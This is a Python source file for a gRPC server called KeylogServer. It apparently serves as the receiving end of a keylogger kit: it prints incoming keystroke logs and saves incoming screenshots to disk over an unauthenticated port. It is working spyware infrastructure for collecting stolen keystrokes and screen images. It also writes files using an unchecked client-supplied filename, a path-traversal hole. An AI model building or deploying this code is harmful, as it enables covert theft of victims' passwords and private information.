import grpc
from concurrent import futures
import protos.server_pb2 as keylog_pb2
import protos.server_pb2_grpc as keylog_pb2_grpc
import os
from datetime import datetime

class KeylogServer(keylog_pb2_grpc.KeylogServiceServicer):
    def __init__(self):
        # Create screenshots directory for received images
        self.screenshot_dir = "received_screenshots"
        if not os.path.exists(self.screenshot_dir):
            os.makedirs(self.screenshot_dir)
    
    def SendKeylog(self, request, context):
        print("Received:", request.message)
        return keylog_pb2.KeylogResponse(response=True)
    
    def SendScreenshot(self, request, context):
        try:
            # Save the screenshot
            filepath = os.path.join(self.screenshot_dir, request.filename)
            with open(filepath, 'wb') as f:
                f.write(request.image_data)
            
            print(f"📸 Screenshot received and saved: {filepath}")
            return keylog_pb2.ScreenshotResponse(
                success=True,
                message=f"Screenshot saved: {filepath}"
            )
        except Exception as e:
            print(f"❌ Error saving screenshot: {e}")
            return keylog_pb2.ScreenshotResponse(
                success=False,
                message=f"Error: {str(e)}"
            )

server = grpc.server(futures.ThreadPoolExecutor(max_workers=10))
keylog_pb2_grpc.add_KeylogServiceServicer_to_server(KeylogServer(), server)
server.add_insecure_port("[::]:50051")
print("🚀 gRPC Server started on port 50051")
print("📁 Screenshots will be saved in: received_screenshots/")
server.start()
server.wait_for_termination()